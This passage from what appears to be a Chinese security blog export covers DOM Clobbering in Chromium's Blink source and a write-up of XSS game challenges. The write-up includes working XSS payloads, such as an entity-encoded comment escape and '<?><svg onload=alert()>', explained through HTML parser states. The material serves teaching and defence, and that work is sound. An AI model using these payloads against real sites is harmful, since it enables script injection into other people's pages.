Searchï¼Œè¿™ä¸ªå¹³å°å¯ä»¥æ¯”è¾ƒæ–¹ä¾¿å®¡ä»£ç ã€‚\nLocation é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹locationï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨window.locationä¹Ÿå¯ä»¥ä½¿ç”¨document.locationæ‹¿åˆ°locationï¼Œè¿™ä¹Ÿèƒ½è¯´æ˜æˆ‘ä»¬ä¸ºä»€ä¹ˆä¸Šæ–‡è¦å•ç‹¬ fuzz Document ç‰¹æœ‰çš„å±æ€§è€Œä¸æ˜¯å…¨éƒ¨å±æ€§äº†ã€‚\nåœ¨ Chromium æºç ä¸­ï¼Œæ‰¾åˆ°locationæ¯”è¾ƒç®€å•ï¼Œ Chromium ç›´æ¥è°ƒç”¨äº†windowå¯¹è±¡çš„location()ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦†ç›–ä¸äº†ã€‚\nåœ¨third_party/blink/renderer/core/dom/document.ccä¸­ï¼Œç¬¬ 933 è¡Œä¸­æœ‰ç›¸å…³å®šä¹‰ Document::location()\nLocation* Document::location() const { if (!GetFrame()) return nullptr; return domWindow()-\u0026gt;location(); } å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥è°ƒç”¨äº†domWindow()æ¥è·å–locationï¼Œåœ¨third_party/blink/renderer/core/frame/dom_window.ccä¸­ï¼Œç¬¬85è¡Œæœ‰ç›¸å…³å®šä¹‰ DOMWindow::location()\nLocation* DOMWindow::location() const { if (!location_) location_ = MakeGarbageCollected\u0026lt;Location\u0026gt;(const_cast\u0026lt;DOMWindow*\u0026gt;(this)); return location_.Get(); } å¦å¤–ï¼Œæœ‰äººæè¿‡ç›¸å…³ç”¨å…¶ä»– hook çš„æ–¹å¼ Issue 315760: document.domain can be hookedï¼Œé‡Œé¢æåˆ°å¯ä»¥ hook åˆ° domain è·Ÿ location ï¼Œä½†æ˜¯æˆ‘åœ¨ç›®å‰ stable chrome ä¸Šæµ‹è¯•åªèƒ½ hook åˆ° domain ï¼Œè‡³äº location ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¢«ä¿®äº†ï¼Œå°½ç®¡å›å¤çš„æ˜¯\u0026quot;Browsers allow hooking these properties. It doesn\u0026rsquo;t matter\u0026quot;\nCookie è¿™é‡Œç®€å•çœ‹äº†ä¸€ä¸‹ Cookie çš„å®ç°ï¼Œä¸»è¦æ˜¯è¿™ä¸¤éƒ¨åˆ†ä»£ç ï¼š\nDocument::cookie\nString Document::cookie(ExceptionState\u0026amp; exception_state) const { if (GetSettings() \u0026amp;\u0026amp; !GetSettings()-\u0026gt;GetCookieEnabled()) return String(); CountUse(WebFeature::kCookieGet); if (!GetSecurityOrigin()-\u0026gt;CanAccessCookies()) { if (IsSandboxed(mojom::blink::WebSandboxFlags::kOrigin)) exception_state.ThrowSecurityError( \u0026#34;The document is sandboxed and lacks the \u0026#39;allow-same-origin\u0026#39; flag.\u0026#34;); else if (Url().ProtocolIs(\u0026#34;data\u0026#34;)) exception_state.ThrowSecurityError( \u0026#34;Cookies are disabled inside \u0026#39;data:\u0026#39; URLs.\u0026#34;); else exception_state.ThrowSecurityError(\u0026#34;Access is denied for this document.\u0026#34;); return String(); } else if (GetSecurityOrigin()-\u0026gt;IsLocal()) { CountUse(WebFeature::kFileAccessedCookies); } if (!cookie_jar_) return String(); return cookie_jar_-\u0026gt;Cookies(); } CookieJar::Cookies()\nString CookieJar::Cookies() { KURL cookie_url = document_-\u0026gt;CookieURL(); if (cookie_url.IsEmpty()) return String(); RequestRestrictedCookieManagerIfNeeded(); String value; backend_-\u0026gt;GetCookiesString(cookie_url, document_-\u0026gt;SiteForCookies(), document_-\u0026gt;TopFrameOrigin(), \u0026amp;value); return value; } ä»¥åŠï¼Œè™½ç„¶ cookie ä¸èƒ½è¢«å®Œå…¨å­—ç¬¦ä¸²åŒ–æ§åˆ¶ï¼Œä½†æ˜¯å¯ä»¥è¢« Clobbered çš„é—®é¢˜åœ¨2å¹´å‰ä¹Ÿæœ‰äººæŠ¥å‘Šè¿‡è¿™ä¸ªç›¸å…³çš„é—®é¢˜ document.cookie DOM property can be clobbered using DOM node named cookie\nåªä¸è¿‡ç›®å‰çš„ä¸»æµæµè§ˆå™¨éƒ½æ˜¯\u0026quot;Safari, Chrome and Firefox all behave the same here\u0026quot;ã€‚\nDocument Collection æ¶‰åŠåˆ° Collection çš„ Document éƒ¨åˆ†ï¼š\nDocumentNameCollection::ElementMatches\nbool DocumentNameCollection::ElementMatches(const HTMLElement\u0026amp; element) const { // Match images, forms, embeds, objects and iframes by name,  // object by id, and images by id but only if they have  // a name attribute (this very strange rule matches IE)  auto* html_embed_element = DynamicTo\u0026lt;HTMLEmbedElement\u0026gt;(\u0026amp;element); if (IsA\u0026lt;HTMLFormElement\u0026gt;(element) || IsA\u0026lt;HTMLIFrameElement\u0026gt;(element) || (html_embed_element \u0026amp;\u0026amp; html_embed_element-\u0026gt;IsExposed())) return element.GetNameAttribute() == name_; auto* html_image_element = DynamicTo\u0026lt;HTMLObjectElement\u0026gt;(\u0026amp;element); if (html_image_element \u0026amp;\u0026amp; html_image_element-\u0026gt;IsExposed()) return element.GetNameAttribute() == name_ || element.GetIdAttribute() == name_; if (IsA\u0026lt;HTMLImageElement\u0026gt;(element)) { const AtomicString\u0026amp; name_value = element.GetNameAttribute(); return name_value == name_ || (element.GetIdAttribute() == name_ \u0026amp;\u0026amp; !name_value.IsEmpty()); } return false; } Window Collection æ¶‰åŠåˆ° Collection çš„ Window éƒ¨åˆ†ï¼š\nWindowNameCollection::ElementMatches\nbool WindowNameCollection::ElementMatches(const Element\u0026amp; element) const { // Match only images, forms, embeds and objects by name,  // but anything by id  if (IsA\u0026lt;HTMLImageElement\u0026gt;(element) || IsA\u0026lt;HTMLFormElement\u0026gt;(element) || IsA\u0026lt;HTMLEmbedElement\u0026gt;(element) || IsA\u0026lt;HTMLObjectElement\u0026gt;(element)) { if (element.GetNameAttribute() == name_) return true; } return element.GetIdAttribute() == name_; } Bouns Tip 1 Global Scope ç”±äº Dom Clobbering åˆ©ç”¨æ–¹å¼ä¹‹ä¸€å°±æ˜¯ hook å…¨å±€ä½œç”¨åŸŸä¸‹çš„å˜é‡ï¼Œåˆç”±äº Javascript æ˜¯ä¸€é—¨ååˆ†ç¥å¥‡çš„è¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³¨æ„å¦‚ä¸‹å‡ ç‚¹\næ˜¾å¼å£°æ˜ \u0026lt;script\u0026gt; var a = 1; let b = 2; var c = function () {}; console.log(window.a);\t//1  console.log(window.b);\t//undefined  console.log(window.c);\t//Æ’ () {} \u0026lt;/script\u0026gt; éšå¼å£°æ˜ \u0026lt;script\u0026gt; function test(a){ b = a + 1; } test(1); console.log(window.b);\t//2 \u0026lt;/script\u0026gt; ä¸å¸¦æœ‰å£°æ˜å…³é”®å­—çš„å˜é‡ï¼ŒJavascript ä¼šè‡ªåŠ¨æŒ‚è½½åˆ°å…¨å±€ä½œç”¨åŸŸä¸Šã€‚\nlet \u0026amp; var ES6 ä¸­æ–°å¢äº†letå‘½ä»¤ï¼Œç”¨æ¥å£°æ˜å˜é‡ã€‚å®ƒçš„ç”¨æ³•ç±»ä¼¼äºvarï¼Œä½†æ˜¯æ‰€å£°æ˜çš„å˜é‡ï¼Œåªåœ¨letå‘½ä»¤æ‰€åœ¨çš„ä»£ç å—å†…æœ‰æ•ˆã€‚è¯¦ç»†å¯ä»¥å‚è€ƒ let åŸºæœ¬ç”¨æ³•\n{ let a = 10; var b = 1; } a // ReferenceError: a is not defined. b // 1 ä¸Šé¢ä»£ç åœ¨ä»£ç å—ä¹‹ä¸­ï¼Œåˆ†åˆ«ç”¨letå’Œvarå£°æ˜äº†ä¸¤ä¸ªå˜é‡ã€‚ç„¶ååœ¨ä»£ç å—ä¹‹å¤–è°ƒç”¨è¿™ä¸¤ä¸ªå˜é‡ï¼Œç»“æœletå£°æ˜çš„å˜é‡æŠ¥é”™ï¼Œvarå£°æ˜çš„å˜é‡è¿”å›äº†æ­£ç¡®çš„å€¼ã€‚è¿™è¡¨æ˜ï¼Œletå£°æ˜çš„å˜é‡åªåœ¨å®ƒæ‰€åœ¨çš„ä»£ç å—æœ‰æ•ˆã€‚\nè€Œä¸”æœ‰äº›å¾ˆå¥‡å¦™çš„æ“ä½œï¼Œæ¯”å¦‚ï¼š\nlet a = b = 6; window.a;\t//undefined window.b;\t//6 Tip 2 Overwrite function è™½ç„¶å¯ä»¥ Clobber å‡½æ•°ï¼Œä½†æ˜¯ç›®å‰æˆ‘æ²¡æ‰¾åˆ°ä»€ä¹ˆæ–¹æ³•è®©ä»–æ‰§è¡Œæˆ‘ä»¬ Clobber çš„ç»“æœï¼Œæˆ–è€…è¯´ç›®å‰è²Œä¼¼ä¹Ÿæ²¡æœ‰åŠæ³•é€šè¿‡æ ‡ç­¾æ¥å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥åªèƒ½æ˜¯å¼•èµ·ä¸€ä¸ªæŠ¥é”™ï¼Œ\n\u0026lt;img id=\u0026#39;getElementById\u0026#39; name=\u0026#39;getElementById\u0026#39;\u0026gt; \u0026lt;script\u0026gt; var a = document.getElementById(\u0026#39;x\u0026#39;);\t//Uncaught TypeError: document.getElementById is not a function \u0026lt;/script\u0026gt; è™½ç„¶åªèƒ½å¼•èµ·æŠ¥é”™ï¼Œä½†æ˜¯åœ¨ä¸€å®šåœºæ™¯ä¸‹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡ä¸€äº›åˆ¤æ–­ï¼Œä¾‹å¦‚ï¼š\n\u0026lt;img id=\u0026#39;getElementById\u0026#39; name=\u0026#39;getElementById\u0026#39;\u0026gt; \u0026lt;script\u0026gt; var a = document.getElementById(\u0026#39;x\u0026#39;);\t//Uncaught TypeError: document.getElementById is not a function  //We must use sanitize a here. \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; //We have sanitized a. We can trust a now!  //Do something with a. \u0026lt;/script\u0026gt; ç¬¬ä¸€ä¸ª JS ä»£ç å—è™½ç„¶å¼•èµ·äº†æŠ¥é”™ï¼Œä½†æ˜¯ä¸ä¼šå¼•èµ· JS å®Œå…¨åœæ­¢æ‰§è¡Œï¼ŒJS ä¼šè·³è¿‡è¿™ä¸ªæŠ¥é”™çš„ä»£ç å—ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªä»£ç å—ã€‚\nTip 3 Prototype Pollution åŸå‹é“¾æ±¡æŸ“å¯ä»¥å—ï¼Ÿ\næˆ‘ç›®å‰å°è¯•çš„æ–¹æ³•è¿˜æ²¡æˆåŠŸï¼Œå¦‚æœå¸ˆå‚…å°è¯•æˆåŠŸäº†ä¸€å®šè¦è·Ÿæˆ‘åˆ†äº«ï¼\nDefence  æœ€ç®€å•çš„æ˜¯åˆ¤æ–­æ¯ä¸ªå˜é‡é¢„æœŸçš„ç±»å‹ä»¥é¿å…éé¢„æœŸç±»å‹çš„ç¯¡æ”¹ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥æ£€æŸ¥ Dom èŠ‚ç‚¹çš„ attribute å±æ€§æ˜¯å¦å®é™…ä¸Šæ˜¯ NamedNodeMap çš„å®ä¾‹ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿è¯¥å±æ€§æ˜¯ä¸€ä¸ª attributes å±æ€§ï¼Œè€Œä¸æ˜¯æ”»å‡»è€…æ’å…¥çš„ HTMLElementã€‚ æ¯•ç«Ÿè¿™ç§æ”»å‡»ä¸»è¦å‡ºç°åœ¨å…¨å±€å˜é‡è¿™ä¸€å—ï¼Œæ‰€ä»¥ä»£ç è§„èŒƒååˆ†é‡è¦ï¼ ä½¿ç”¨ç»è¿‡æµ‹è¯•çš„åº“ï¼Œä¾‹å¦‚ DOMPurify ã€‚  References DOM FLOW UNTANGLING THE DOM FOR EASY BUGS\nDOM Clobbering Attack\nDOM Clobbering strikes back\nDOM Clobbering\nClobbering the clobbered â€” Advanced DOM Clobbering\nXSS in GMailâ€™s AMP4Email via DOM Clobbering\n[DOM Clobbering Attackå­¦ä¹ è®°å½•.md](https://wonderkun.cc/2020/02/15/DOM Clobbering Attackå­¦ä¹ è®°å½•)\nIm DOM hÃ¶rt Dich keiner schreien\nDec 20: Sanitising HTML â€“ the DOM clobbering issue\nè°ˆè°ˆ JavaScript çš„ä½œç”¨åŸŸ\n","date":"2020-03-04T02:15:58Z","permalink":"https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/","title":"ä½¿ç”¨ Dom Clobbering æ‰©å±• XSS"},{"content":"è¿‡å¹´æœŸé—´ç©äº†ä¸€ä¸‹å›½å¤–çš„ä¸€ä¸ª XSS GAMEï¼Œæ”¶è·é¢‡ä¸°ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹ã€‚æœ¬äººå¯¹äº JavaScript ä»¥åŠå‰ç«¯çš„ç†è§£ä¸æ·±ï¼Œæ°´å¹³ä¹Ÿä¸é«˜ï¼Œå¦‚æœæ–‡ç« æœ‰ç–æ¼ä¹‹å¤„ï¼Œè¿˜è¯·å¸ˆå‚…ä»¬æ–§æ­£ã€‚\nIntroduction æ‰€æœ‰é¢˜ç›®çš„ç›®æ ‡éƒ½æ˜¯å®ç°alert(1337)å³å¯ï¼Œæœ‰ç€ä¸åŒçš„éš¾åº¦\nArea 51 \u0026lt;!-- Challenge --\u0026gt; \u0026lt;div id=\u0026#34;pwnme\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var input = (new URL(location).searchParams.get(\u0026#39;debug\u0026#39;) || \u0026#39;\u0026#39;).replace(/[\\!\\-\\/\\#\\\u0026amp;\\;\\%]/g, \u0026#39;_\u0026#39;); var template = document.createElement(\u0026#39;template\u0026#39;); template.innerHTML = input; pwnme.innerHTML = \u0026#34;\u0026lt;!-- \u0026lt;p\u0026gt; DEBUG: \u0026#34; + template.outerHTML + \u0026#34; \u0026lt;/p\u0026gt; --\u0026gt;\u0026#34;; \u0026lt;/script\u0026gt; é¢˜ç›®æºä»£ç å¦‚ä¸Šï¼Œé¢˜ç›®ä»£ç æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆå¯¹ç”¨æˆ·ä¼ å…¥çš„ debug å‚æ•°è¿›è¡Œå…³é”®å­—è¿‡æ»¤è½¬æ¢ï¼Œå¯¹äº!-/#\u0026amp;;%ç¬¦å·éƒ½ä¼šè¢«ä¸‹åˆ’çº¿æ›¿ä»£ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª template æ ‡ç­¾ï¼Œæ ‡ç­¾çš„ HTML å†…å®¹ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ï¼Œæœ€ååœ¨ä¸€ä¸ª div ä¸­ï¼ŒæŠŠæ„å»ºå¥½çš„ template æ ‡ç­¾è¾“å‡ºåœ¨ä¸€ä¸ªæ³¨é‡Šå½“ä¸­ã€‚\næ‰€ä»¥æˆ‘ä»¬çš„ä¸»è¦å¾—ç»•è¿‡æ³¨é‡Šç¬¦çš„é™åˆ¶ï¼Œç”±äº\u0026lt;!--æ˜¯å¤šè¡Œæ³¨é‡Šï¼Œæ‰€ä»¥æ¢è¡Œçš„æ€è·¯æˆ‘ä»¬åŸºæœ¬ä¸å¯è¡Œï¼Œå³ä½¿æ²¡æœ‰æŠŠ--è¿‡æ»¤ï¼ŒJSä¹Ÿä¼šåœ¨ç¬¬ä¸€æ­¥template.innerHTMLå°†æˆ‘ä»¬çš„--\u0026gt;ä¸­çš„\u0026gt;è¿›è¡Œè½¬ä¹‰ã€‚æ‰€ä»¥åŸºæœ¬ä¸Šæˆ‘ä»¬å¯ä»¥â€œç›´æ¥â€œé—­åˆçš„æ€è·¯æ˜¯è¡Œä¸é€šçš„ã€‚\né¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ HTML è§£æé¡ºåºï¼Œé¦–å…ˆå…ˆè§£æ HTML éƒ¨åˆ†ä»£ç ï¼Œå†ç”¨ JS è§£é‡Šå™¨ JS ä»£ç ï¼ŒJSè§£é‡Šå™¨ä¼šè¾¹è§£é‡Šè¾¹æ‰§è¡Œï¼Œå¯¹äº innerHTML ä¼šä½¿ç”¨ HTML parser è§£æå…¶ä¸­çš„ä»£ç ã€‚æœ¬é¢˜ä¼šåˆ©ç”¨åˆ°ä¸€äº› HTML parser çš„çŸ¥è¯†ï¼Œå»ºè®®é…åˆ W3 æ–‡æ¡£ The HTML syntaxï¼Œä¸æƒ³çœ‹è‹±æ–‡çš„è¯ä¹Ÿå¯ä»¥å‡‘åˆå‡‘åˆçœ‹çœ‹æœ¬èœä¹‹å‰å†™çš„ å…³äº HTML ç¼–ç  çš„æ°´æ–‡ã€‚\nEasy Version æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªç®€å•çš„ç‰ˆæœ¬ï¼Œå½“æ—¶ç”±äºå‡ºé¢˜è€…æ¯”è¾ƒç–å¿½ï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤\u0026amp;#;ï¼Œå¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥ç”¨ HTML å®ä½“ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œç›´æ¥é—­åˆæ³¨é‡Šè¿›è€Œå®ç° alert ï¼Œä¾‹å¦‚ï¼Œåœ¨æ²¡æœ‰è¿‡æ»¤\u0026amp;#;çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆåšï¼š\n\u0026lt;img title=\u0026#34;\u0026amp;#x2D;\u0026amp;#x2D;\u0026amp;#x3E;\u0026amp;#x3C;\u0026amp;#x73;\u0026amp;#x76;\u0026amp;#x67;\u0026amp;#x2F;\u0026amp;#x6F;\u0026amp;#x6E;\u0026amp;#x6C;\u0026amp;#x6F;\u0026amp;#x61;\u0026amp;#x64;\u0026amp;#x3D;\u0026amp;#x61;\u0026amp;#x6C;\u0026amp;#x65;\u0026amp;#x72;\u0026amp;#x74;\u0026amp;#x28;\u0026amp;#x29;\u0026amp;#x3E;\u0026#34;\u0026gt;1 ä½¿ç”¨ HTML ç¼–ç å°†æˆ‘ä»¬çš„ payload è¿›è¡Œç¼–ç ç»•è¿‡\n--\u0026gt;\u0026lt;svg/onload=alert()\u0026gt;  \nä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥ä¼ å…¥ HTML ç¼–ç ç»•è¿‡ï¼Œå¾—éœ€è¦åŠ ä¸€ä¸ª img æ ‡ç­¾åˆ©ç”¨å…¶å±æ€§è¿›è¡Œç»•è¿‡ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\nå› ä¸ºè¿™é‡Œå…¶å®æœ‰ä¸¤æ¬¡ HTML è§£ç çš„æ“ä½œï¼Œç¬¬ä¸€ä¸ªæ˜¯template.innerHTMLï¼Œç¬¬äºŒä¸ªæ˜¯pwnme.innerHTMLï¼Œç¬¬ä¸€ä¸ªè§£ç æ“ä½œä¼šç›´æ¥æŠŠæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¿›è¡Œè§£ç ï¼Œå¹¶ä¸”å¯¹å…¶ä¸­çš„\u0026lt;\u0026gt;è¿›è¡Œè½¬ä¹‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®é™…ä¸Šç¬¬ä¸€ä¸ªå¾—åˆ°çš„æ˜¯å¦‚ä¸‹å†…å®¹ï¼š\n--\u0026amp;gt;\u0026amp;lt;svg/onload=alert()\u0026amp;gt; åœ¨ç¬¬äºŒæ­¥æ¸²æŸ“çš„æ—¶å€™å°±è‡ªç„¶ä¸å¯èƒ½é—­åˆæ³¨é‡Šäº†ï¼Œåªèƒ½å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š\n\u0026lt;!-- \u0026lt;p\u0026gt; DEBUG: \u0026lt;template\u0026gt;--\u0026amp;gt;\u0026amp;lt;svg/onload=alert()\u0026amp;gt;\u0026lt;/template\u0026gt; \u0026lt;/p\u0026gt; --\u0026gt; æ‰€ä»¥å½“æˆ‘ä»¬å€ŸåŠ© img å±æ€§è¿›è¡Œç»•è¿‡çš„æ—¶å€™ï¼Œç¬¬ä¸€æ­¥å¾—åˆ°çš„å®é™…ä¸Šæ˜¯ï¼š\n\u0026lt;img title=\u0026#34;--\u0026gt;\u0026lt;svg/onload=alert()\u0026gt;\u0026#34;\u0026gt;1 HTML parserä¸ä¼šå°† title å±æ€§å†…çš„å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥ç¬¬äºŒæ­¥å½“ç›´æ¥è¾“å‡ºåˆ°é¡µé¢çš„æ—¶å€™\n\u0026lt;!-- \u0026lt;p\u0026gt; DEBUG: \u0026lt;template\u0026gt;\u0026lt;img title=\u0026#34;--\u0026gt;\u0026lt;svg onload=\u0026#34;alert()\u0026#34;\u0026gt;\u0026#34;\u0026amp;gt;1 \u0026lt;/svg\u0026gt;\u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; --\u0026amp;gt; ç„¶åå½“ HTML parser è§£æè¿™æ®µä»£ç æ—¶ï¼Œé¦–å…ˆç”±\u0026lt;!çš„å­˜åœ¨ï¼Œä¼šè¿›å…¥Markup declaration open stateï¼Œä¸­é—´çš„ä»£ç \u0026lt;p\u0026gt; DEBUG: \u0026lt;template\u0026gt;\u0026lt;img title=\u0026quot;ä¼šè®© HTML parser è¿›å…¥ä¸€äº›å…¶ä»–å…³äº comment çš„çŠ¶æ€ï¼Œè¿™äº›éƒ½æ— å…³ç´§è¦ï¼Œæœ€åçš„--\u0026gt;è®© HTML parser è¿›å…¥åˆ°äº†Comment End Stateï¼Œæ ¹æ® W3 æ–‡æ¡£ï¼š\n Comment end state\nConsume the next input character:\n  U+003E GREATER-THAN SIGN (\u0026gt;)\nSwitch to the data state. Emit the comment token.\n   æ¥ç€æˆ‘ä»¬å°±è¿›å…¥åˆ°äº† data stateï¼Œä¹Ÿå°±æ˜¯ç»“æŸäº†æ³¨é‡Šè§£æçŠ¶æ€å›åˆ°äº†æœ€å¼€å§‹çš„ HTML è§£æçŠ¶æ€ï¼Œè¿™æ ·å°±å¯¼è‡´æˆ‘ä»¬å°±æˆåŠŸé€ƒé€¸äº†æ³¨é‡Šç¬¦ã€‚\nDifficult Version å†è¿‡æ»¤äº†å®ä½“ç¼–ç \u0026amp;#;ä¹‹åæˆ‘ä»¬è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿæˆ‘ä»¬å…ˆç»™å‡ºä¸€ä¸ª Trick ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨\u0026lt;?è¿›è¡Œç»•è¿‡ã€‚\n \nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ä½¿ç”¨äº†\u0026lt;?ä¹‹åæˆåŠŸæŠŠ p æ ‡ç­¾é€ƒé€¸äº†å‡ºæ¥ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥è¾“å‡ºç¬¬ä¸€æ­¥çš„template.innerHTMLçœ‹çœ‹\n \næˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ç¬¬ä¸€æ­¥æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼ å…¥çš„\u0026lt;?å·²ç»å˜æˆäº†\u0026lt;!--?--\u0026gt;ï¼Œå­˜åœ¨--\u0026gt;å¯ä»¥å°†æ³¨é‡Šé—­åˆã€‚å¯æ˜¯è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\nåœ¨template.innerHTML = input çš„æ—¶å€™ï¼Œä¼šè§£æinputï¼Œç„¶åä½¿ç”¨ HTML parser è§£æï¼Œæ ¹æ® W3 æ–‡æ¡£\n â€‹\tImplementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the data state.\n è§£æåˆ°\u0026lt;çš„æ—¶å€™ï¼ŒHTML parser æ­£å¤„äº data state\n Data state\nConsume the next input character:\n  U+0026 AMPERSAND (\u0026amp;)\nSet the return state to the data state. Switch to the character reference state.\n  U+003C LESS-THAN SIGN (\u0026lt;)\nSwitch to the tag open state.\n  U+0000 NULL\nParse error. Emit the current input character as a character token.\n  EOF\nEmit an end-of-file token.\n  Anything else\nEmit the current input character as a character token.\n   äºæ˜¯è¿›å…¥ tag open state\n Tag open state\nConsume the next input character:\n  U+0021 EXCLAMATION MARK (!)\nSwitch to the markup declaration open state.\n  U+002F SOLIDUS (/)\nSwitch to the end tag open state.\n  ASCII letter\nCreate a new start tag token, set its tag name to the empty string. Reconsume in the tag name state.\n  U+003F QUESTION MARK (?)\nParse error. Create a comment token whose data is the empty string. Reconsume in the bogus comment state.\n  Anything else\nParse error. Emit a U+003C LESS-THAN SIGN character token. Reconsume in the data state.\n   ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯?ï¼Œæ ¹æ®æ–‡æ¡£ï¼ŒHTML parser ä¼šåˆ›å»ºä¸€ä¸ªç©ºçš„ comment tokenï¼Œè¿›å…¥ bogus comment stateï¼Œ\n Bogus comment state\nConsume the next input character:\n  U+003E GREATER-THAN SIGN (\u0026gt;)\nSwitch to the data state. Emit the comment token.\n  EOF\nEmit the comment. Emit an end-of-file token.\n  U+0000 NULL\nAppend a U+FFFD REPLACEMENT CHARACTER character to the comment tokenâ€™s data.\n  Anything else\nAppend the current input character to the comment tokenâ€™s data.\n   ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ anything elseï¼Œä¼šå°†è¿™ä¸ªå­—ç¬¦æ’å…¥åˆ°åˆšåˆšçš„ comment ä¸­ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šå›¾çœ‹åˆ°çš„\u0026lt;!--?--\u0026gt;ï¼Œä¾‹å¦‚è¾“å…¥æ˜¯aaa\u0026lt;?bbb\u0026gt;cccçš„æ—¶å€™ï¼Œè§£æåˆ°ç¬¬ i ä¸ªå­—ç¬¦æ—¶ï¼ŒinnerHTML çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š\na aa aaa aaa\u0026lt; aaa\u0026lt;!--?--\u0026gt; aaa\u0026lt;!--?b--\u0026gt; aaa\u0026lt;!--?bb--\u0026gt; aaa\u0026lt;!--?bbb--\u0026gt; aaa\u0026lt;!--?bbb--\u0026gt; aaa\u0026lt;!--?bbb--\u0026gt;c aaa\u0026lt;!--?bbb--\u0026gt;cc aaa\u0026lt;!--?bbb--\u0026gt;ccc ç›´åˆ°è¯¥çŠ¶æ€é‡åˆ°äº†\u0026gt;ä¸ºæ­¢ï¼Œå›åˆ° data stateã€‚æ³¨æ„è¿™ä¸ª Bogus comment state è§£æåˆ°\u0026gt;çš„æ—¶å€™ä¼šç›´æ¥å›åˆ° data stateï¼Œä¹Ÿå°±æ˜¯ HTML parser æœ€å¼€å§‹è§£æçš„çŠ¶æ€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æ’å…¥ HTML ä»£ç äº†ã€‚\nå½“æˆ‘ä»¬ä¼ å…¥\u0026lt;?\u0026gt;\u0026lt;svg onload=alert()\u0026gt;æ—¶ï¼Œç¬¬ä¸€æ­¥template.innerHTMLæˆ‘ä»¬å¾—åˆ°çš„æ˜¯\n\u0026lt;!--?--\u0026gt;\u0026lt;svg onload=\u0026#34;alert()\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; ç¬¬äºŒæ­¥pwnme.innerHTMLæˆ‘ä»¬å¾—åˆ°çš„æ˜¯\n\u0026lt;!-- \u0026lt;p\u0026gt; DEBUG: \u0026lt;template\u0026gt;\u0026lt;!--?--\u0026gt;\u0026lt;svg onload=\u0026#34;alert()\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; --\u0026amp;gt; è¿™æ—¶å€™ HTML parser è§£æä¸æˆ‘ä»¬åœ¨ Easy Version åˆ†æå·®ä¸å¤šï¼Œåªæœ‰é‡åˆ°--\u0026gt;çš„æ—¶å€™ç»“æŸ Comment State ç›¸å…³çŠ¶æ€å›åˆ° data stateï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æˆåŠŸæ‰§è¡Œäº† XSSã€‚\nKeanu \u0026lt;!-- Challenge --\u0026gt; \u0026lt;number id=\u0026#34;number\u0026#34; style=\u0026#34;display:none\u0026#34;\u0026gt;\u0026lt;/number\u0026gt; \u0026lt;div class=\u0026#34;alert alert-primary\u0026#34; role=\u0026#34;alert\u0026#34; id=\u0026#34;welcome\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;keanu\u0026#34; class=\u0026#34;btn btn-primary btn-sm\u0026#34; data-toggle=\u0026#34;popover\u0026#34; data-content=\u0026#34;DM @PwnFunction\u0026#34; data-trigger=\u0026#34;hover\u0026#34; onclick=\u0026#34;alert(`If you solved it, DM me @PwnFunction :)`)\u0026#34;\u0026gt;Solved it?\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; /* Input */ var number = (new URL(location).searchParams.get(\u0026#39;number\u0026#39;) || \u0026#34;7\u0026#34;)[0], name = DOMPurify.sanitize(new URL(location).searchParams.get(\u0026#39;name\u0026#39;), { SAFE_FOR_JQUERY: true }); $(\u0026#39;number#number\u0026#39;).html(number); $(\u0026#39;#welcome\u0026#39;).html(`Welcome \u0026lt;b\u0026gt;${name || \u0026#34;Mr. Wick\u0026#34;}!\u0026lt;/b\u0026gt;`); /* Greet */ 